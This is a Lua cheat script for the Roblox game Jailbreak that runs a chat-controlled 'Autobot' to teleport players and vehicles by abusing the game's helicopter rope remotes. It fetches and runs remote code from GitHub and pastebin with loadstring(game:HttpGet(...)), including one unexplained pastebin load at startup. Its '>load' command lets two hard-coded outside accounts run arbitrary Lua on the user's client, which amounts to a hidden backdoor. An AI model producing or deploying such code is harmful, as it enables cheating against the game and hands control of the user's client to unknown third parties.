local Players = game:GetService('Players')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local StarterGui = game:GetService("StarterGui")
local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)

local TeleportKeywords = { 'tp', 'teleport' }
local TP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Introvert1337/RobloxReleases/main/Scripts/Jailbreak/Teleporation.lua"))()

local Admins = { Players.LocalPlayer.UserId, 849923120, 4490705778 }

local Teleports = {
  [{'casino', 'casino security', 'casinosecurity'}] = { CFrame.new(-90, 71, -4721), CFrame.new(-239, 18, -4636) },
  [{'casinofloor', 'casino floor'}] = { CFrame.new(-117, 22, -4698), CFrame.new(-239, 18, -4636) },
  [{'casinovaults', 'casinovault', 'casino vaults', 'casino vault'}] = { CFrame.new(211, -75, -4526), CFrame.new(-239, 18, -4636) },
  [{'tomb'}] = { CFrame.new(540, 25, -495), CFrame.new(609, 20, -491) },
  [{'powerplant', 'power', 'power plant'}] = { CFrame.new(157, 25, 2288), CFrame.new(67, 21, 2333) },
  [{'mansionelevator', 'mansion elevator'}] = { CFrame.new(3197, 63, -4657), CFrame.new(3044, 57, -4627) },
  [{'mansion'}] = { CFrame.new(3195, 63, -4607), CFrame.new(3044, 57, -4627) },
  [{'jstore', 'jewlery', 'jewelry', 'j store'}] = { CFrame.new(120, 22, 1314), CFrame.new(129, 18, 1368) },
  [{'msm', 'museum'}] = { CFrame.new(1130, 107, 1304), CFrame.new(1066, 101, 1245) },
  [{'bank'}] = { CFrame.new(32, 22, 859), CFrame.new(-13, 18, 864) },
  [{'bankdoor', 'bank door'}] = { CFrame.new(39, 22, 924), CFrame.new(-13, 18, 864) },

  [{'bankvault', 'bank vault'}] = 'f',
  [{'train'}] = 'f'
}

local WeaponsList = "ak47, shotgun, revolver, pistol, etc."
local TeleportList = "casinofloor, casino, casinovaults, tomb, mansionelevator, mansion, powerplant, train, jstore, bank, bankvault, bankdoor, msm"
local CarList = "volt, camaro, lambo, torpedo, etc. (Uses Internal Vehicle Name)"
local HelpText = ">tp >teleport (Teleport Car) >spawn (Spawn Car) >escape (Auto Escape Robbery/Prison) >give (Spawn Weapon)"

function FindSpec(Vehicle)
  local Specs = require(ReplicatedStorage.Module.UI).CircleAction.Specs
  for _, v in Specs do
    if not v.IsVehicle then continue end
    if not v.ValidRoot then continue end
    if v.Name ~= "Enter Driver" and v.Name ~= "Hijack" then continue end
    if v.ValidRoot ~= Vehicle then continue end
    return v
  end
end

function FindClosestHeli()
  local Vehicles = workspace.Vehicles:GetChildren()
  local Root = Players.LocalPlayer.Character.PrimaryPart
  local Range = 5000
  local Closest
  
  for _, v in Vehicles do
    if v.Name ~= 'Heli' then continue end
    if v:GetAttribute("Locked") then continue end
    if v.Seat.PlayerName.Value ~= "" then continue end
    local Delta = v.PrimaryPart.Position - Root.Position
    
    if Delta.Magnitude < Range then
      Range = Delta.Magnitude
      Closest = v
    end
  end
  
  return Closest
end

function findplayercar(player)
  local Vehicles = workspace.Vehicles:GetChildren()

  for _, v in Vehicles do
    if v:FindFirstChild("Seat") then
      for _, v2 in v:GetChildren() do
        if v2.Name == "Seat" or v2.Name == "Passenger" then
          if v2.PlayerName.Value == player.Name then
            return v
          end
        end
      end
    end
  end
end

function TimeoutTP(Location)
  local TP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Introvert1337/RobloxReleases/main/Scripts/Jailbreak/Teleporation.lua"))()
  local Success = false
  spawn(function()
    TP(Location)
    Success = true
  end)

  local Timeout = false
  spawn(function()
    task.wait(20)
    Timeout = true
  end)

  while not Success do task.wait()
    if Timeout then
      return false
    end
  end

  return true
end

function GetTeleport(Location)
  local Aliases
  local TeleportData
  for i, v in Teleports do
    if table.find(i, Location) then
      TeleportData = v
      Aliases = i
    end
  end

  if not TeleportData then
    Say(TeleportList)
    return
  end

  if TeleportData == 'f' then
    if Aliases[1] == 'bankvault' then
      local Vault = workspace.Banks:FindFirstChild("Money", true)
      if not Vault then
        Say("Bank is closed.")
        return
      end

      return Vault.CFrame, CFrame.new(-13, 18, 864)
    else
      if not workspace.Trains:GetChildren()[1] then
        Say("No train on the map.")
        return
      end

      local Train = workspace.Trains:GetChildren()[1]:GetBoundingBox()
      return Train, Train
    end
  end

  return unpack(TeleportData)
end

function Say(Text)
  SayMessageRequest:FireServer('[Autobot] '.. Text, 'All')
end

local Teleporting = false
function EnterHelicopter()
  local Vehicles = require(ReplicatedStorage.Game.Vehicle)
  local HeliClass = Vehicles.Classes.Heli

  local Heli = FindClosestHeli()
  if not Heli then
    Say('No helicopter right now.')
    Teleporting = false
    return false
  end

  Say('Travelling to nearest heli...')
  if not TimeoutTP(Heli.PrimaryPart.CFrame) then
    Say("The travel timed out.")
    Teleporting = false
    return false
  end

  if not Heli then
    Say("Helicopter Disappeared ;c")
    Teleporting = false
    return false
  end

  if
    Heli:GetAttribute("Locked") or
    Heli.Seat.PlayerName.Value ~= "" then

    Say('Travel Failed.')
    Teleporting = false
    return false
  end

  local Spec = FindSpec(Heli)
  local Result, Error = pcall(function()
    while not Vehicles.GetLocalVehicleModel() do
      Spec:Callback(true)
      task.wait()
    end
  end)

  if not Result then
    Teleporting = false
    Say(Error)
    return false
  end

  HeliClass.attemptDropRope()
  local Vehicle = Vehicles.GetLocalVehicleModel()
  Vehicle:PivotTo(CFrame.new(Vehicle.PrimaryPart.Position + Vector3.new(0, 2000, 0)))
  while not Vehicle.Preset:FindFirstChild("RopePull") do
    task.wait()
  end

  task.wait(1)
  return Vehicle
end

function Teleport(Player, Location)
  if Teleporting then Say('Teleport already in progress!') return end
  if not GetTeleport(Location) then Say('That is not a valid teleport.') return end
  local Vehicles = require(ReplicatedStorage.Game.Vehicle)
  local Vehicle = Vehicles.GetLocalVehicleModel()
  Teleporting = true

  if
    not Vehicle or
    not Vehicle:FindFirstChild("Preset") or
    not Vehicle.Preset:FindFirstChild("RopePull") then
    
    require(ReplicatedStorage.Game.CharacterUtil).OnJump()
    Vehicle = EnterHelicopter()
    if not Vehicle then
      return
    end
  end

  local TargetVehicle = findplayercar(Player)
  if not TargetVehicle then
    Say('You need to be in a vehicle to use this command.')
    Teleporting = false
    return
  end

  Say('Teleporting '.. Player.DisplayName)
  local PlayerTeleport, CarTeleport = GetTeleport(Location)
  local RopePull = Vehicle.Preset.RopePull
  local Rope = Vehicle.Winch.RopeConstraint

  while RopePull.AttachedTo.Value do task.wait()
    RopePull.ReqUnlink:FireServer(RopePull.AttachedTo.Value)
  end

  Rope.WinchEnabled = true
  RopePull.CanCollide = false
  RopePull.Massless = true

  while not RopePull.AttachedTo.Value do task.wait()
    RopePull.CFrame = TargetVehicle.PrimaryPart.CFrame * CFrame.new(0, 50, 0)
    RopePull.ReqLink:FireServer(TargetVehicle, Vector3.new(0, 0, 0))
  end

  local TP = true
  spawn(function()
    task.wait(5)
    TP = false
  end)

  while Player.Character:FindFirstChild("InVehicle") and TP do task.wait()
    RopePull.CFrame = TargetVehicle.PrimaryPart.CFrame * CFrame.new(0, 1000, 0)
    Player.Character:PivotTo(PlayerTeleport)
  end

  if not TP then
    Teleporting = false
    if table.find({'bankvault', 'bank vault'}, Location) then
      Say("This bank vault is incompatible with >tp :(")
    else
      Say("Teleport Failed.")
    end
  else
    for i = 1, 16 do task.wait()
      RopePull.CFrame = TargetVehicle.PrimaryPart.CFrame * CFrame.new(0, 1000, 0)
      TargetVehicle:PivotTo(CarTeleport)
    end
  end

  RopePull.ReqUnlink:FireServer(TargetVehicle)
  RopePull.CFrame = Vehicle.PrimaryPart.CFrame
  RopePull.CanCollide = true
  Rope.WinchEnabled = false
  RopePull.Massless = false
  Teleporting = false
end

local Delay = false
function Safety(Time)
  require(ReplicatedStorage.Game.CharacterUtil).OnJump()
  spawn(function()
    Delay = true
    task.wait(Time)
    Delay = false
  end)
end

function CheckAutobot(Command, Tokens)
  if Tokens[1] == 'lyft' then
    return 20
  end

  if Command == 'hack casino' then
    return 10
  end

  if Command == 'tomb' then
    return 5
  end

  return false
end

function SpawnCar(Player, CarName)
  local Vehicles = require(ReplicatedStorage.Game.Vehicle)
  local Vehicle = Vehicles.GetLocalVehicleModel()
  if Teleporting then
    Say("Teleport already in progress.")
    return
  end

  local VehicleName
  for _, v in ReplicatedStorage.Resource.Vehicles:GetChildren() do
    local Name = string.sub(v.Name, 0, #CarName)
    if string.lower(Name) == string.lower(CarName) then
      VehicleName = v.Name
      break
    end
  end

  if not VehicleName then
    Say("That is not the name of any vehicle.")
    return
  end

  local TargetVehicle
  for _, v in workspace.Vehicles:GetChildren() do
    if v.Name ~= VehicleName then continue end
    if v:GetAttribute("Locked") then continue end
    if v.Seat.PlayerName.Value ~= "" then continue end
    if not v.PrimaryPart then continue end
    TargetVehicle = v
    break
  end

  if not TargetVehicle then
    Say("Unable to spawn, it is not in server.")
    return
  end

  Teleporting = true

  if
    not Vehicle or
    not Vehicle:FindFirstChild("Preset") or
    not Vehicle.Preset:FindFirstChild("RopePull") then
    
    require(ReplicatedStorage.Game.CharacterUtil).OnJump()
    Vehicle = EnterHelicopter()
    if not Vehicle then
      return
    end
  end

  Say('Spawning '.. VehicleName)
  local RopePull = Vehicle.Preset.RopePull
  local Rope = Vehicle.Winch.RopeConstraint

  while RopePull.AttachedTo.Value do task.wait()
    RopePull.ReqUnlink:FireServer(RopePull.AttachedTo.Value)
  end

  Rope.WinchEnabled = true
  RopePull.CanCollide = false
  RopePull.Massless = true

  local Result = pcall(function()
    while not RopePull.AttachedTo.Value do task.wait()
      RopePull.CFrame = TargetVehicle.PrimaryPart.CFrame
      RopePull.ReqLink:FireServer(TargetVehicle, Vector3.new(0, 0, 0))
    end
  end)

  if not Result then Teleporting = false return end
  local RopeLocation = TargetVehicle.PrimaryPart.CFrame
  local CarTeleport = Player.Character.PrimaryPart.CFrame * CFrame.new(5, 0, 0)
  for i = 1, 32 do task.wait()
    RopePull.CFrame = RopeLocation
    TargetVehicle:PivotTo(CarTeleport)
  end

  RopePull.ReqUnlink:FireServer(TargetVehicle)
  RopePull.CFrame = Vehicle.PrimaryPart.CFrame
  RopePull.CanCollide = true
  Rope.WinchEnabled = false
  RopePull.Massless = false

  Teleporting = false
end

function GetAttached(Player, RopePull)
  local Root = Player.Character.PrimaryPart
  return Root:FindFirstChild("Weld") and Root.Weld.Part1 == RopePull
end
  
function TeleportMansion(Player)
  if Teleporting then
    Say("Teleport already in progress.")
    return
  end

  local Location = workspace.MansionRobbery:FindFirstChild("ExitDoor", true).Touch
  local RopeLocation = Player.Character.PrimaryPart.CFrame
  local Vehicles = require(ReplicatedStorage.Game.Vehicle)
  local Vehicle = Vehicles.GetLocalVehicleModel()
  Teleporting = true

  if
    not Vehicle or
    not Vehicle:FindFirstChild("Preset") or
    not Vehicle.Preset:FindFirstChild("RopePull") then
    
    require(ReplicatedStorage.Game.CharacterUtil).OnJump()
    Vehicle = EnterHelicopter()
    if not Vehicle then
      return
    end
  end

  Say("Creating Teleport Instance for ".. Player.DisplayName)
  local RopePull = Vehicle.Preset.RopePull
  local Rope = Vehicle.Winch.RopeConstraint
  RopePull.CanCollide = false
  Rope.WinchEnabled = true

  local SafeTeleport = true
  spawn(function()
    task.wait(15)
    SafeTeleport = false
  end)

  while not GetAttached(Player, RopePull) and SafeTeleport do task.wait()
    RopePull.AssemblyLinearVelocity = Vector3.zero
    RopePull.AssemblyAngularVelocity = Vector3.zero
    RopePull.CFrame = RopeLocation
  end

  if not SafeTeleport then
    RopePull.CFrame = Vehicle.PrimaryPart.CFrame
    RopePull.CanCollide = true
    Rope.WinchEnabled = false
    return
  end

  local MansionTeleport = true
  spawn(function()
    task.wait(5)
    MansionTeleport = false
  end)

  while GetAttached(Player, RopePull) and MansionTeleport do task.wait()
    RopePull.AssemblyLinearVelocity = Vector3.zero
    RopePull.AssemblyAngularVelocity = Vector3.zero
    Player.Character:PivotTo(Location.CFrame)
  end

  RopePull.CFrame = Vehicle.PrimaryPart.CFrame
  RopePull.CanCollide = true
  Rope.WinchEnabled = false
  Rope.Length = 30
end

local AutobotWorking = true
function Handle(Player, Text)
  local Token = string.sub(string.lower(Text), 1, 1)
  if Token ~= '>' then return end

  local Command = string.gsub(string.lower(Text), ">", "")
  local RawCommand = string.gsub(Text, ">", "")
  local Tokens = {}

  for token in string.gmatch(Command, "[^%s]+") do
    if token == 'to' and Tokens[1] and Tokens[1] == 'tp' then
      Command = string.gsub(Command, ' to', '')
      continue
    end

    table.insert(Tokens, token)
  end

  if Command == 'turnon' and table.find(Admins, Player.UserId) then
    AutobotWorking = true
    Say("The teleport feature has been turned on.")
    return
  end

  if Command == 'turnoff' and table.find(Admins, Player.UserId) then
    AutobotWorking = false
    Teleporting = false
    Say("The teleport feature has been turned off.")
  end

  if not AutobotWorking then return end
  local TimedDelay = CheckAutobot(Command, Tokens)
  if TimedDelay then
    Safety(TimedDelay)
    return
  end

  if Tokens[1] == 'load' and table.find(Admins, Player.UserId) then
    if #Tokens > 1 then
      local Cmd = string.format("%s ", Tokens[1])
      local Exec = string.gsub(RawCommand, Cmd, '')
      loadstring(Exec)()
    else
      loadstring(game:HttpGet("https://pastebin.com/raw/Gm61jqjm", true))()
    end

    return
  end

  if Tokens[1] == 'mansion' or Tokens[1] == 'escape' then
    TeleportMansion(Player)
    Teleporting = false
    return
  end

  if Command == 'reset' then
    if table.find(Admins, Player.UserId) then
      Teleporting = false
      Say("Autobot has reset teleport feature! [Admin]")
    end
  end

  if Tokens[1] == 'give' then
    if #Tokens == 1 then
      Say(WeaponsList)
      return
    end

    Say("This command has not been implemented yet.")
    return
  end

  if Command == 'help' then
    Say(HelpText)
    return
  end

  if Tokens[1] == 'spawn' then
    if Delay then return end
    if #Tokens == 1 then
      Say(CarList)
      return
    end

    SpawnCar(Player, Tokens[2])
    return
  end

  if table.find(TeleportKeywords, Tokens[1]) then
    if Delay then return end
    if #Tokens == 1 then
      Say(TeleportList)
      return
    end

    local TargetPlayer
    if #Tokens >= 3 and table.find(Admins, Player.UserId) then
      for _, v in Players:GetChildren() do
        if string.sub(string.lower(v.Name), 0, #Tokens[2]) == Tokens[2] then
          TargetPlayer = v
        end
      end
    end

    if TargetPlayer then
      local Cmd = string.format("%s %s ", Tokens[1], Tokens[2])
      Teleport(TargetPlayer, string.gsub(Command, Cmd, ''))
      return
    end

    local Cmd = string.format("%s ", Tokens[1])
    Teleport(Player, string.gsub(Command, Cmd, ''))
  end
end

Players.PlayerChatted:Connect(function(Type, Player, Text)
  if Type == Enum.PlayerChatType.All then
    Handle(Player, Text)
  end
end)

Say("AutoBot Teleport V4 Loaded! [Nexus42]")
loadstring(game:HttpGet("https://pastebin.com/raw/y8fPvChX", true))()
print("Ready.")
